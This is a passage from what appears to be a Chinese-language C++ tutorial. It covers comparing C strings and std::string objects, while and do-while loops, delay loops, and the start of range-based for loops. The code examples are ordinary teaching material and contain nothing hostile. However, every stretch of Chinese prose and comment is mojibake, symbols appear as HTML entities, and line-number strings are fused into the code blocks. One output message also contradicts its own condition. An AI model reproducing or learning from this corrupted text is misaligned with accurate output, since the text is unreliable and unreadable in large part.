&quot;apple&quot;; char word2[] = &quot;apply&quot;; char word3[] = &quot;apple&quot;; const char *p1 = &quot;banana&quot;; const char *p2 = &quot;banana&quot;; // ç¼–è¯‘å™¨å¯èƒ½å°†ç›¸åŒçš„å­—é¢å€¼å­˜å‚¨åœ¨åŒä¸€åœ°å€ const char *p3 = word1; // é”™è¯¯: æ¯”è¾ƒåœ°å€ if (word1 == word3) &#123; // æ¯”è¾ƒä¸¤ä¸ªä¸åŒæ•°ç»„çš„åœ°å€ï¼Œç»“æœé€šå¸¸æ˜¯ false std::cout &lt;&lt; &quot;Mistake: word1 == word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Mistake: word1 != word3 (comparing addresses)&quot; &lt;&lt; std::endl; &#125; if (p1 == p2) &#123; // å¯èƒ½ true (å¦‚æœç¼–è¯‘å™¨ä¼˜åŒ–)ï¼Œä¹Ÿå¯èƒ½ false std::cout &lt;&lt; &quot;Info: p1 == p2 (compiler might optimize literals)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Info: p1 != p2 (compiler might not optimize literals)&quot; &lt;&lt; std::endl; &#125; if (p3 == word1) &#123; // true, p3 æŒ‡å‘ word1 çš„èµ·å§‹åœ°å€ std::cout &lt;&lt; &quot;Info: p3 == word1 (same address)&quot; &lt;&lt; std::endl; &#125; // æ­£ç¡®: ä½¿ç”¨ strcmp() æ¯”è¾ƒå†…å®¹ if (strcmp(word1, word3) == 0) &#123; // æ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸ç­‰ std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) != 0&quot; &lt;&lt; std::endl; &#125; if (strcmp(word1, word2) &lt; 0) &#123; // æ¯”è¾ƒ word1 æ˜¯å¦å°äº word2 std::cout &lt;&lt; &quot;Correct: strcmp(word1, word2) &lt; 0 (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.15 æ¯”è¾ƒstringç±»å­—ç¬¦ä¸²ä¸ C é£æ ¼å­—ç¬¦ä¸²ä¸åŒï¼ŒC++ çš„ std::string ç±»é‡è½½äº†æ‰€æœ‰çš„å…³ç³»è¿ç®—ç¬¦ï¼ˆ==, !=, &lt;, &gt;, &lt;=, &gt;=ï¼‰ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›è¿ç®—ç¬¦æ¥æ¯”è¾ƒä¸¤ä¸ª std::string å¯¹è±¡çš„å†…å®¹ï¼ˆæŒ‰å­—å…¸åºè¿›è¡Œæ¯”è¾ƒï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; std::string s3 = &quot;apple&quot;; std::string s4 = &quot;Banana&quot;; // ç›´æ¥ä½¿ç”¨ == æ¯”è¾ƒå†…å®¹ if (s1 == s3) &#123; std::cout &lt;&lt; &quot;s1 == s3 is true (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 == s3 is false&quot; &lt;&lt; std::endl; &#125; // ç›´æ¥ä½¿ç”¨ != if (s1 != s2) &#123; std::cout &lt;&lt; &quot;s1 != s2 is true&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 != s2 is false&quot; &lt;&lt; std::endl; &#125; // ç›´æ¥ä½¿ç”¨ &lt;, &gt; ç­‰è¿›è¡Œå­—å…¸åºæ¯”è¾ƒ if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;s1 &lt; s2 is true (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; if (s1 &lt; s4) &#123; // æ¯”è¾ƒ &quot;apple&quot; å’Œ &quot;Banana&quot; std::cout &lt;&lt; &quot;s1 &lt; s4 is true (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; // æ³¨æ„ï¼šæ¯”è¾ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œ&#x27;a&#x27; çš„ ASCII å€¼å¤§äº &#x27;B&#x27; &#125; else &#123; std::cout &lt;&lt; &quot;s1 &lt; s4 is false (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; &#125; // ä¹Ÿå¯ä»¥å’Œ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æ¯”è¾ƒ if (s1 == &quot;apple&quot;) &#123; std::cout &lt;&lt; &quot;s1 == \\&quot;apple\\&quot; is true&quot; &lt;&lt; std::endl; &#125; return 0;&#125; ä½¿ç”¨ std::string è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒæ¯”ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å’Œ strcmp() æ›´ç›´è§‚ã€æ›´å®‰å…¨ã€‚ 5.2 whileå¾ªç¯while å¾ªç¯æ˜¯ C++ ä¸­å¦ä¸€ç§é‡è¦çš„å¾ªç¯ç»“æ„ã€‚ä¸ for å¾ªç¯ä¸åŒï¼Œwhile å¾ªç¯åœ¨ç»“æ„ä¸Šæ›´ç®€å•ï¼Œå®ƒåªåŒ…å«ä¸€ä¸ª**æµ‹è¯•æ¡ä»¶ (Test Condition)**ã€‚åªè¦è¯¥æ¡ä»¶ä¸º trueï¼Œå¾ªç¯ä½“å°±ä¼šä¸€ç›´æ‰§è¡Œã€‚ è¯­æ³•: 123456789while (test_condition) &#123; // å¾ªç¯ä½“ (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125;// æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥while (test_condition) single_statement; æ‰§è¡Œæµç¨‹: è®¡ç®— test_conditionã€‚ å¦‚æœ test_condition ä¸º falseï¼Œè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚ å¦‚æœ test_condition ä¸º trueï¼Œæ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚ å›åˆ°æ­¥éª¤ 1ã€‚ å…³é”®ç‚¹: while å¾ªç¯æ˜¯ä¸€ç§**å…¥å£æ¡ä»¶å¾ªç¯ (Entry-Condition Loop)**ï¼Œå³åœ¨æ¯æ¬¡æ‰§è¡Œå¾ªç¯ä½“ä¹‹å‰æ£€æŸ¥æ¡ä»¶ã€‚å¦‚æœç¬¬ä¸€æ¬¡æ£€æŸ¥æ¡ä»¶å°±ä¸º falseï¼Œåˆ™å¾ªç¯ä½“ä¸€æ¬¡ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚ å¾ªç¯ä½“å†…éƒ¨å¿…é¡»æœ‰èƒ½å¤Ÿå½±å“ test_condition çš„è¯­å¥ï¼ˆä¾‹å¦‚ä¿®æ”¹ç”¨äºåˆ¤æ–­çš„å˜é‡ï¼‰ï¼Œå¦åˆ™å¦‚æœæ¡ä»¶åˆå§‹ä¸º trueï¼Œå¾ªç¯å°†æ°¸è¿œä¸ä¼šåœæ­¢ï¼Œå½¢æˆ**æ— é™å¾ªç¯ (Infinite Loop)**ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int count = 0; // ä½¿ç”¨ while å¾ªç¯æ‰“å°æ•°å­— 0 åˆ° 4 std::cout &lt;&lt; &quot;Counting with while (0-4):&quot; &lt;&lt; std::endl; while (count &lt; 5) &#123; // 1. æµ‹è¯•æ¡ä»¶ std::cout &lt;&lt; &quot;count = &quot; &lt;&lt; count &lt;&lt; std::endl; // 2. å¾ªç¯ä½“ count++; // 3. æ›´æ–°æ¡ä»¶å˜é‡ (éå¸¸é‡è¦!) &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; // ç¤ºä¾‹ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥ç‰¹å®šå­—ç¬¦ char response; std::cout &lt;&lt; &quot;\\nEnter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; while (response != &#x27;y&#x27; &amp;&amp; response != &#x27;Y&#x27;) &#123; std::cout &lt;&lt; &quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; &#125; std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; return 0;&#125; 5.2.1 forä¸whilefor å¾ªç¯å’Œ while å¾ªç¯åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯å¯ä»¥äº’æ¢çš„ï¼Œå› ä¸ºå®ƒä»¬éƒ½å¯ä»¥ç”¨æ¥å®ç°åŸºäºæ¡ä»¶çš„é‡å¤æ‰§è¡Œã€‚ è½¬æ¢å…³ç³»: ä¸€ä¸ªå…¸å‹çš„ for å¾ªç¯ï¼š 123for (initialization; test_condition; update) &#123; body;&#125; å¯ä»¥ç­‰ä»·åœ°è½¬æ¢ä¸º while å¾ªç¯ï¼š 12345initialization; // åˆå§‹åŒ–ç§»åˆ°å¾ªç¯ä¹‹å‰while (test_condition) &#123; // æµ‹è¯•æ¡ä»¶ä¿æŒä¸å˜ body; update; // æ›´æ–°ç§»åˆ°å¾ªç¯ä½“çš„æœ«å°¾&#125; é€‰æ‹©ä¾æ®: for å¾ªç¯: ä¼˜ç‚¹: å°†åˆå§‹åŒ–ã€æµ‹è¯•å’Œæ›´æ–°é€»è¾‘é›†ä¸­åœ¨å¾ªç¯å¤´éƒ¨ï¼Œç»“æ„æ¸…æ™°ï¼Œç‰¹åˆ«é€‚ç”¨äºè®¡æ•°å¾ªç¯ï¼ˆå¾ªç¯æ¬¡æ•°å·²çŸ¥æˆ–æ˜“äºè®¡ç®—ï¼‰æˆ–éœ€è¦æŒ‰å›ºå®šæ­¥é•¿è¿­ä»£çš„æƒ…å†µã€‚ é€‚ç”¨åœºæ™¯: éå†æ•°ç»„ã€æŒ‰ç´¢å¼•å¤„ç†å­—ç¬¦ä¸²ã€æ‰§è¡Œå›ºå®šæ¬¡æ•°çš„æ“ä½œã€‚ while å¾ªç¯: ä¼˜ç‚¹: ç»“æ„æ›´ç®€å•ï¼Œåªå…³æ³¨å¾ªç¯æ¡ä»¶ï¼Œé€‚ç”¨äºå¾ªç¯æ¬¡æ•°ä¸ç¡®å®šï¼Œä¾èµ–äºæŸä¸ªäº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜çš„æƒ…å†µã€‚ é€‚ç”¨åœºæ™¯: ç­‰å¾…ç”¨æˆ·è¾“å…¥ã€è¯»å–æ–‡ä»¶ç›´åˆ°ç»“æŸã€å¤„ç†é“¾è¡¨ã€å½“å¾ªç¯æ¡ä»¶æ¯”è®¡æ•°å™¨æ›´æ–°æ›´é‡è¦æ—¶ã€‚ ç¤ºä¾‹ (ä¸¤ç§å¾ªç¯å®ç°ç›¸åŒåŠŸèƒ½): 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; // ä½¿ç”¨ for å¾ªç¯è®¡ç®— 1 åˆ° 5 çš„å’Œ int sum_for = 0; for (int i = 1; i &lt;= 5; ++i) &#123; sum_for += i; &#125; std::cout &lt;&lt; &quot;Sum using for: &quot; &lt;&lt; sum_for &lt;&lt; std::endl; // ä½¿ç”¨ while å¾ªç¯è®¡ç®— 1 åˆ° 5 çš„å’Œ int sum_while = 0; int i_while = 1; // åˆå§‹åŒ– while (i_while &lt;= 5) &#123; // æµ‹è¯•æ¡ä»¶ sum_while += i_while; i_while++; // æ›´æ–° &#125; std::cout &lt;&lt; &quot;Sum using while: &quot; &lt;&lt; sum_while &lt;&lt; std::endl; return 0;&#125; è™½ç„¶ä¸¤è€…å¯ä»¥è½¬æ¢ï¼Œä½†é€‰æ‹©æ›´è‡ªç„¶åœ°è¡¨è¾¾å¾ªç¯æ„å›¾çš„ç»“æ„å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚ 5.2.2 ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼šç¼–å†™å»¶æ—¶å¾ªç¯æœ‰æ—¶æˆ‘ä»¬éœ€è¦è®©ç¨‹åºæš‚åœæ‰§è¡Œä¸€æ®µæ—¶é—´ã€‚è™½ç„¶æœ‰æ›´ç²¾ç¡®ã€æ›´ç°ä»£çš„æ–¹æ³•ï¼ˆå¦‚ C++11 &lt;chrono&gt; å’Œ &lt;thread&gt; åº“ï¼‰ï¼Œä½†å¯ä»¥ä½¿ç”¨å¾ªç¯æ¥å®ç°ç®€å•çš„ã€åŸºäºå¤„ç†å™¨æ—¶é—´çš„**å»¶æ—¶å¾ªç¯ (Delay Loop)**ã€‚ è¿™ç§æ–¹æ³•ä¸ç²¾ç¡®ä¸”ä¸æ¨èç”¨äºå®é™…çš„ç²¾ç¡®å»¶æ—¶ï¼Œå› ä¸ºå®ƒï¼š ä¾èµ–äºå¤„ç†å™¨é€Ÿåº¦: åœ¨å¿«çš„ CPU ä¸Šæ‰§è¡Œæ—¶é—´çŸ­ï¼Œåœ¨æ…¢çš„ CPU ä¸Šæ‰§è¡Œæ—¶é—´é•¿ã€‚ å—ç¼–è¯‘å™¨ä¼˜åŒ–å½±å“: ç¼–è¯‘å™¨å¯èƒ½ä¼šè¯†åˆ«å‡ºå¾ªç¯ä½“ä¸ºç©ºæˆ–æ— å‰¯ä½œç”¨ï¼Œå¹¶å°†å…¶å®Œå…¨ä¼˜åŒ–æ‰ã€‚ æµªè´¹ CPU èµ„æº: å¾ªç¯åœ¨ç©ºè½¬ï¼Œæ¶ˆè€— CPU æ—¶é—´ï¼Œæ— æ³•æ‰§è¡Œå…¶ä»–æœ‰ç”¨ä»»åŠ¡ã€‚ åŸºæœ¬æ€è·¯: æ‰§è¡Œä¸€ä¸ªå·²çŸ¥éœ€è¦ä¸€å®šæ—¶é—´çš„ç©ºå¾ªç¯æˆ–ç®€å•æ“ä½œçš„å¾ªç¯ã€‚ ç¤ºä¾‹ (ä½¿ç”¨ &lt;ctime&gt; åº“): &lt;ctime&gt; (æˆ– C çš„ &lt;time.h&gt;) åº“æä¾›äº†ä¸€äº›ä¸æ—¶é—´ç›¸å…³çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥å®ç°ç¨å¾®å¥½ä¸€ç‚¹ï¼ˆä½†ä»ä¸ç†æƒ³ï¼‰çš„å»¶æ—¶ã€‚ clock(): è¿”å›ç¨‹åºå¯åŠ¨ä»¥æ¥æ‰€ç”¨çš„æ—¶é’Ÿè®¡æ—¶å•å…ƒ (clock ticks) æ•°ã€‚ CLOCKS_PER_SEC: ä¸€ä¸ªå¸¸é‡ï¼Œè¡¨ç¤ºæ¯ç§’åŒ…å«çš„æ—¶é’Ÿè®¡æ—¶å•å…ƒæ•°ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;ctime&gt; // ä¸ºäº† clock() å’Œ CLOCKS_PER_SECint main() &#123; std::cout &lt;&lt; &quot;Starting delay...&quot; &lt;&lt; std::endl; float delay_seconds = 2.5f; // æœŸæœ›å»¶æ—¶ 2.5 ç§’ // è·å–å¼€å§‹æ—¶é—´ clock_t start_time = clock(); // è®¡ç®—ç›®æ ‡ç»“æŸæ—¶é—´ (ä»¥ clock ticks ä¸ºå•ä½) clock_t target_ticks = delay_seconds * CLOCKS_PER_SEC; // å¾ªç¯ç›´åˆ°ç»è¿‡äº†è¶³å¤Ÿå¤šçš„ clock ticks while (clock() &lt; start_time + target_ticks) &#123; // å¾ªç¯ä½“å¯ä»¥ä¸ºç©ºï¼Œæˆ–è€…æ‰§è¡Œä¸€äº›è½»é‡æ“ä½œ // ; // ç©ºè¯­å¥ &#125; std::cout &lt;&lt; &quot;Delay finished after approximately &quot; &lt;&lt; delay_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // å¦ä¸€ä¸ªç®€å•çš„ç©ºå¾ªç¯å»¶æ—¶ (éå¸¸ä¸ç²¾ç¡®) // long wait = 0; // while (wait &lt; 100000000) &#123; // å¾ªç¯æ¬¡æ•°éœ€è¦æ ¹æ®æœºå™¨è°ƒæ•´ // wait++; // &#125; // std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; å†æ¬¡å¼ºè°ƒ: å¯¹äºéœ€è¦ç²¾ç¡®å»¶æ—¶æˆ–æš‚åœæ‰§è¡Œè€Œä¸æµªè´¹ CPU çš„åœºæ™¯ï¼Œåº”ä½¿ç”¨ C++11 åŠæ›´é«˜ç‰ˆæœ¬æä¾›çš„ &lt;chrono&gt; å’Œ &lt;thread&gt; ä¸­çš„ std::this_thread::sleep_for() æˆ– std::this_thread::sleep_until()ã€‚ 1234567891011121314151617#include &lt;iostream&gt;#include &lt;chrono&gt; // ä¸ºäº†æ—¶é—´å•ä½ (e.g., seconds, milliseconds)#include &lt;thread&gt; // ä¸ºäº† std::this_thread::sleep_forint main() &#123; std::cout &lt;&lt; &quot;Starting modern delay...&quot; &lt;&lt; std::endl; // å»¶æ—¶ 2 ç§’ 500 æ¯«ç§’ std::chrono::seconds sec(2); std::chrono::milliseconds ms(500); std::this_thread::sleep_for(sec + ms); // çº¿ç¨‹ä¼‘çœ ï¼Œä¸æ¶ˆè€— CPU std::cout &lt;&lt; &quot;Modern delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; è¿™ä¸ªç°ä»£æ–¹æ³•æ›´ç²¾ç¡®ã€å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå¹¶ä¸”ä¸ä¼šæµªè´¹ CPU å‘¨æœŸã€‚ 5.3 do whileå¾ªç¯do while å¾ªç¯æ˜¯ C++ æä¾›çš„ç¬¬ä¸‰ç§å¾ªç¯ç»“æ„ã€‚å®ƒä¸ while å¾ªç¯éå¸¸ç›¸ä¼¼ï¼Œä½†æœ‰ä¸€ä¸ªå…³é”®åŒºåˆ«ï¼šdo while å¾ªç¯æ˜¯**å‡ºå£æ¡ä»¶å¾ªç¯ (Exit-Condition Loop)**ï¼Œè€Œ while å¾ªç¯æ˜¯å…¥å£æ¡ä»¶å¾ªç¯ã€‚ è¿™æ„å‘³ç€ do while å¾ªç¯ä¼šå…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“ï¼Œç„¶åå†æ£€æŸ¥æµ‹è¯•æ¡ä»¶ã€‚åªè¦æ¡ä»¶ä¸º trueï¼Œå¾ªç¯å°±ä¼šç»§ç»­æ‰§è¡Œã€‚ è¯­æ³•: 123456do &#123; // å¾ªç¯ä½“ (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; while (test_condition); // æ³¨æ„è¿™é‡Œçš„æ¡ä»¶åé¢å¿…é¡»æœ‰åˆ†å· ; æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥ï¼ˆè™½ç„¶ä¸å¸¸è§ï¼Œä¸”ä¸ºäº†æ¸…æ™°é€šå¸¸è¿˜æ˜¯ç”¨èŠ±æ‹¬å·ï¼‰ï¼š 123do single_statement;while (test_condition); æ‰§è¡Œæµç¨‹: æ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚ è®¡ç®— test_conditionã€‚ å¦‚æœ test_condition ä¸º trueï¼Œå›åˆ°æ­¥éª¤ 1ã€‚ å¦‚æœ test_condition ä¸º falseï¼Œå¾ªç¯ç»ˆæ­¢ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚ å…³é”®ç‚¹: è‡³å°‘æ‰§è¡Œä¸€æ¬¡: ç”±äºæ¡ä»¶æ˜¯åœ¨å¾ªç¯ä½“æ‰§è¡Œä¹‹åæ£€æŸ¥çš„ï¼Œdo while å¾ªç¯çš„å¾ªç¯ä½“è‡³å°‘ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå³ä½¿æ¡ä»¶åˆå§‹å°±ä¸º falseã€‚ åˆ†å·: while (test_condition) åé¢å¿…é¡»æœ‰ä¸€ä¸ªåˆ†å· ;ã€‚ é€‚ç”¨åœºæ™¯: å½“ä½ éœ€è¦ç¡®ä¿å¾ªç¯ä½“ä¸­çš„ä»£ç è‡³å°‘æ‰§è¡Œä¸€æ¬¡æ—¶ï¼Œdo while å¾ªç¯æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œè·å–ç”¨æˆ·è¾“å…¥å¹¶éªŒè¯ï¼Œè‡³å°‘éœ€è¦è·å–ä¸€æ¬¡è¾“å…¥æ‰èƒ½è¿›è¡ŒéªŒè¯ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;int main() &#123; int number; // ç¤ºä¾‹ï¼šè¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ­£æ•° // å¾ªç¯ä½“è‡³å°‘æ‰§è¡Œä¸€æ¬¡ä»¥è·å–è¾“å…¥ do &#123; std::cout &lt;&lt; &quot;Enter a positive number: &quot;; std::cin &gt;&gt; number; if (number &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; &#125; &#125; while (number &lt;= 0); // æ¡ä»¶åœ¨è¾“å…¥ä¹‹åæ£€æŸ¥ std::cout &lt;&lt; &quot;You entered the positive number: &quot; &lt;&lt; number &lt;&lt; std::endl; // æ¯”è¾ƒ: å¦‚æœä½¿ç”¨ whileï¼Œéœ€è¦å…ˆè·å–ä¸€æ¬¡è¾“å…¥ // int number_while; // std::cout &lt;&lt; &quot;\\nEnter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // while (number_while &lt;= 0) &#123; // std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // &#125; // std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl; // å³ä½¿æ¡ä»¶åˆå§‹ä¸º falseï¼Œå¾ªç¯ä½“ä¹Ÿæ‰§è¡Œä¸€æ¬¡ int count = 5; std::cout &lt;&lt; &quot;\\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot; &lt;&lt; std::endl; do &#123; std::cout &lt;&lt; &quot; Inside do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // è¿™è¡Œä¼šæ‰§è¡Œ count++; &#125; while (count &lt; 5); // ç¬¬ä¸€æ¬¡æ£€æŸ¥æ—¶ count æ˜¯ 6, æ¡ä»¶ä¸º false std::cout &lt;&lt; &quot;After do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // count å˜ä¸º 6 return 0;&#125; ä¸ while å’Œ for çš„æ¯”è¾ƒ: while: å…¥å£æ¡ä»¶ï¼Œå¯èƒ½ä¸€æ¬¡éƒ½ä¸æ‰§è¡Œã€‚ for: é€šå¸¸ç”¨äºè®¡æ•°æˆ–å·²çŸ¥è¿­ä»£æ¬¡æ•°ï¼Œç»“æ„åŒ…å«åˆå§‹åŒ–ã€æ¡ä»¶ã€æ›´æ–°ã€‚ do while: å‡ºå£æ¡ä»¶ï¼Œä¿è¯è‡³å°‘æ‰§è¡Œä¸€æ¬¡ã€‚ æ ¹æ®å¾ªç¯é€»è¾‘é€‰æ‹©æœ€åˆé€‚çš„å¾ªç¯ç»“æ„å¯ä»¥ä½¿ä»£ç æ›´æ¸…æ™°ã€æ›´æ˜“äºç†è§£ã€‚å¦‚æœéœ€è¦ç¡®ä¿æ“ä½œè‡³å°‘å‘ç”Ÿä¸€æ¬¡ï¼ˆå¦‚èœå•é€‰æ‹©ã€è¾“å…¥éªŒè¯ï¼‰ï¼Œdo while æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ 5.4 åŸºäºèŒƒå›´çš„forå¾ªç¯ï¼ˆC++11ï¼‰C++11 å¼•å…¥äº†ä¸€ç§æ›´ç®€æ´ã€æ›´æ˜“è¯»çš„ for å¾ªç¯è¯­æ³•ï¼Œç§°ä¸ºåŸºäºèŒƒå›´çš„ for å¾ªç¯ (Range-Based for Loop) æˆ– å¢å¼º for å¾ªç¯ (Enhanced for Loop)**ã€‚å®ƒä¸“é—¨ç”¨äºéå†ä¸€ä¸ªåºåˆ—ï¼ˆæˆ–èŒƒå›´ï¼‰ä¸­çš„æ‰€æœ‰å…ƒç´ **ï¼Œä¾‹å¦‚æ•°ç»„ã€STL å®¹å™¨ï¼ˆå¦‚ vector, array, stringï¼‰ã€åˆå§‹åŒ–åˆ—è¡¨ç­‰ã€‚ ç›®çš„: ç®€åŒ–éå†æ“ä½œï¼Œå‡å°‘æ‰‹åŠ¨ç®¡ç†ç´¢å¼•æˆ–è¿­ä»£å™¨çš„ä»£ç ï¼Œé¿å…å¸¸è§çš„å·®ä¸€é”™è¯¯ (off-by-one errors)ã€‚ è¯­æ³•: 12345for (declaration : range_expression) &#123; // å¾ªç¯ä½“ // ä½¿ç”¨ declaration è®¿é—®å½“å‰å…ƒç´  statement;&#125; declaration: å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå…¶ç±»å‹åº”ä¸ range_expression ä¸­å…ƒç´ çš„ç±»å‹å…¼å®¹ï¼ˆæˆ–å¯ä»¥è½¬æ¢ï¼‰ã€‚åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£ä¸­ï¼Œè¯¥å˜é‡ä¼šè¢«åˆå§‹åŒ–ä¸ºèŒƒå›´ä¸­çš„å½“å‰å…ƒç´ ã€‚ é€šå¸¸ä½¿ç”¨ auto è®©ç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­ç±»å‹ã€‚ auto variable: variable ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„å‰¯æœ¬ã€‚ä¿®æ”¹ variable ä¸ä¼šå½±å“åŸå§‹åºåˆ—ä¸­çš„å…ƒç´ ã€‚ auto&amp; variable: variable ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„å¼•ç”¨ã€‚ä¿®æ”¹ variable ä¼šä¿®æ”¹åŸå§‹åºåˆ—ä¸­çš„å…ƒç´ ã€‚ç”¨äºéœ€è¦ä¿®æ”¹å…ƒç´ æˆ–é¿å…å¤åˆ¶å¤§å‹å¯¹è±¡å¼€é”€çš„æƒ…å†µã€‚ const auto&amp; variable: variable ä¼šæˆä¸ºå½“å‰å…ƒç´ çš„å¸¸é‡å¼•ç”¨ã€‚ä¸èƒ½é€šè¿‡ variable ä¿®æ”¹å…ƒç´ ï¼Œä½†å¯ä»¥é¿å…å¤åˆ¶å¼€é”€ã€‚ç”¨äºåªè¯»è®¿é—®ã€‚ :: ç”¨äºåˆ†éš”å£°æ˜å’ŒèŒƒå›´è¡¨è¾¾å¼ã€‚ range_expression: ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºåºåˆ—çš„è¡¨è¾¾å¼ã€‚è¿™é€šå¸¸æ˜¯ï¼š æ•°ç»„åã€‚ STL å®¹å™¨å¯¹è±¡ï¼ˆå¦‚ std::vector, std::array, std::string, std::list ç­‰ï¼‰ã€‚ åˆå§‹åŒ–åˆ—è¡¨ &#123; ... &#125;ã€‚ ä»»ä½•å®šä¹‰äº† begin() å’Œ end() æˆå‘˜å‡½æ•°æˆ–å¯ä»¥é€šè¿‡å…¨å±€ begin() å’Œ end() å‡½æ•°è·å–è¿­ä»£å™¨çš„å¯¹è±¡ã€‚ æ‰§è¡Œæµç¨‹: å¾ªç¯ä¼šè‡ªåŠ¨éå† range_expression ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ã€‚åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼š ä»åºåˆ—ä¸­è·å–ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚ å°†è¯¥å…ƒç´ çš„å€¼ï¼ˆæˆ–å¼•ç”¨ï¼‰èµ‹ç»™ declaration ä¸­å£°æ˜çš„å˜é‡ã€‚ æ‰§è¡Œå¾ªç¯ä½“ã€‚ é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´åˆ°éå†å®Œåºåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;array&gt; // ä¸ºäº† std::arrayint main() &#123; // 1. éå†æ•°ç»„ double prices[] = &#123;19.99, 25.50, 9.75, 100.0&#125;; std::cout &lt;&lt; &quot;Prices (array):&quot;; for (double price : prices) &#123; // price æ˜¯æ¯ä¸ªå…ƒç´ çš„å‰¯æœ¬ std::cout &lt;&lt; &quot; &quot; &lt;&lt; price; &#125; std::cout &lt;&lt; std::endl; // 2. éå† std::vector std::vector&lt;int&gt; numbers = &#123;1, 2, 3, 4, 5&#125;; std::cout &lt;&lt; &quot;Numbers (vector):&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // 3. éå† std::string std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Characters (string):&quot;; for (char c : message) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; c; &#125; std::cout &lt;&lt; std::endl; // 4. 